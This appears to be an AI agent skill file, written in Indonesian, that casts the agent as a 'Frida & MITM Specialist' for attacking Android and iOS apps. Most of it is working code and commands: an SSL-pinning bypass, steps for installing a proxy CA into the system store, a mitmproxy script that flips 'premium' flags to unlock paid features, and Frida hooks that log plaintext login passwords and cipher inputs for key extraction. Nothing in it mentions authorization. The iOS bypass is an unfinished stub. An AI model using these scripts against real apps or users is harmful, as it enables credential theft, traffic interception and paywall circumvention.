---
name: frida-mitm-specialist
description: "Frida dynamic instrumentation dan MITM (Man-in-the-Middle) attacks — hook Android/iOS apps, bypass SSL pinning, intercept traffic, runtime manipulation. Gunakan untuk mobile app testing, API reverse engineering, bypass certificate validation."
---

# Frida & MITM Specialist

## 1. FRIDA SETUP

```bash
# Install Frida
pip3 install frida-tools frida

# Frida server di Android (rooted)
adb push frida-server-[version]-android-[arch] /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Verify
frida-ps -U  # List processes di USB-connected device
```

## 2. SSL PINNING BYPASS

### Via Frida Script
```javascript
// ssl_bypass.js - Universal SSL pinning bypass
Java.perform(function() {
    // TrustManager bypass
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    // OkHttp pinning bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[*] OkHttp SSL pinning bypassed!');
        };
    } catch(e) { console.log('OkHttp not found'); }
    
    // Network Security Config bypass
    try {
        var Platform = Java.use('com.android.org.conscrypt.Platform');
        Platform.checkServerTrusted.implementation = function() { return; };
    } catch(e) {}
});
```

```bash
# Jalankan bypass
frida -U -f com.target.app -l ssl_bypass.js --no-pause

# Atau attach ke proses yang sudah berjalan
frida -U com.target.app -l ssl_bypass.js
```

### Via Objection (Automated)
```bash
# Install
pip3 install objection

# Bypass SSL pinning otomatis
objection -g com.target.app explore
# Di dalam objection shell:
android sslpinning disable
```

## 3. MITM SETUP

### Burp Suite sebagai Proxy
```bash
# Android: Set proxy ke IP:8080
# Install Burp CA cert ke device (Settings > Security > Install CA)

# Untuk Android 7+ (user certs tidak trusted):
# Install cert ke system store (butuh root)
adb root
adb shell "mount -o rw,remount /system"
adb push burp-ca.crt /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/burp-ca.crt"
```

### mitmproxy
```bash
# Install
pip3 install mitmproxy

# Start
mitmproxy --mode transparent --showhost
# atau
mitmweb  # Web interface

# Transparent mode (butuh iptables)
iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080
```

### mitmproxy Script untuk Auto-Manipulation
```python
# intercept.py - manipulasi request/response
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Hapus SSL pinning headers
    if "X-SSL-Pinning" in flow.request.headers:
        del flow.request.headers["X-SSL-Pinning"]
    
    # Inject headers
    flow.request.headers["X-Custom-Header"] = "test"
    
    # Log semua requests
    print(f"{flow.request.method} {flow.request.url}")

def response(flow: http.HTTPFlow) -> None:
    # Manipulasi response
    if b"premium" in flow.response.content:
        flow.response.content = flow.response.content.replace(b"false", b"true")

# Run: mitmweb -s intercept.py
```

## 4. FRIDA HOOKING PATTERNS

### Hook Login Function
```javascript
// Hook Android login
Java.perform(function() {
    var LoginActivity = Java.use('com.target.app.LoginActivity');
    
    LoginActivity.login.implementation = function(username, password) {
        console.log('[*] Login called!');
        console.log('    username: ' + username);
        console.log('    password: ' + password);  // Grab plaintext!
        
        // Call original
        return this.login(username, password);
    };
});
```

### Hook HTTP Client
```javascript
// Hook OkHttp requests
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    
    // Hook newCall
    OkHttpClient.newCall.implementation = function(request) {
        console.log('[*] OkHttp Request: ' + request.url().toString());
        console.log('    Method: ' + request.method());
        // Log headers
        var headers = request.headers();
        for(var i = 0; i < headers.size(); i++) {
            console.log('    ' + headers.name(i) + ': ' + headers.value(i));
        }
        return this.newCall(request);
    };
});
```

### Hook Crypto/Encryption
```javascript
// Hook AES encryption
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[*] Cipher.doFinal called');
        console.log('    Algorithm: ' + this.getAlgorithm());
        console.log('    Input: ' + bytesToHex(input));
        
        var result = this.doFinal(input);
        console.log('    Output: ' + bytesToHex(result));
        return result;
    };
});

function bytesToHex(bytes) {
    var hex = '';
    for(var i = 0; i < bytes.length; i++) {
        hex += ('0' + (bytes[i] & 0xFF).toString(16)).slice(-2);
    }
    return hex;
}
```

## 5. IOS FRIDA

```bash
# Install Frida pada jailbroken iOS
# Via Cydia: add repo https://build.frida.re
# Install: Frida

# Connect
frida-ps -U

# SSL bypass iOS
frida -U -f com.target.app -l ios_ssl_bypass.js
```

```javascript
// iOS SSL bypass
ObjC.schedule(ObjC.mainQueue, function() {
    var NSURLSession = ObjC.classes.NSURLSession;
    // ... bypass implementation
});
```

## 6. TOOLS REFERENSI

| Tool | Fungsi |
|------|--------|
| Frida | Dynamic instrumentation |
| Objection | Frida-based mobile testing |
| mitmproxy | HTTP/HTTPS interceptor |
| Burp Suite | Full-featured proxy/scanner |
| Charles Proxy | GUI proxy (Mac) |
| apktool | APK decompile |
| jadx | APK → Java source |
| r2frida | Radare2 + Frida |

## CHECKLIST MOBILE PENTEST

1. ☐ APK analysis (jadx/apktool) → cari hardcoded credentials
2. ☐ Setup Burp/mitmproxy
3. ☐ Bypass SSL pinning (Frida/Objection)
4. ☐ Intercept semua API calls
5. ☐ Test authentication bypass
6. ☐ Test API endpoints langsung
7. ☐ Hook crypto functions untuk key extraction
8. ☐ Test untuk IDOR, improper authorization
